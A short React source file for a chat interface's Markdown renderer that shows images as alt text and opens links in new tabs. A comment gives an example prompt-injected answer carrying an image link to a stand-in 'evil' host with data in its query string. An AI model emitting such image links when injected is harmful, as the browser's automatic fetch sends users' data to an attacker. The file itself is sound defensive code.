import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

// GFM adds tables, strikethrough and task lists
const PLUGINS = [remarkGfm];

// Model output is untrusted: a prompt-injected answer could carry `![](https://evil/?d=<data>)`, and the browser
// would fetch it on its own, so images show their alt text. Links open in a new tab: the chat lives in memory.
const COMPONENTS: Components = {
  img: ({ alt }) => <>{alt}</>,
  a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer" />,
  // a wide table scrolls by itself instead of pushing the whole chat sideways
  table: ({ node, ...props }) => (
    <div className="overflow-x-auto">
      <table {...props} />
    </div>
  ),
};

// react-markdown builds React elements, so raw HTML in the text shows as text, never as markup
export function Markdown({ children }: { children: string }) {
  return (
    <div className="prose max-w-none wrap-break-word prose-pre:whitespace-pre-wrap">
      <ReactMarkdown remarkPlugins={PLUGINS} components={COMPONENTS}>
        {children}
      </ReactMarkdown>
    </div>
  );
}
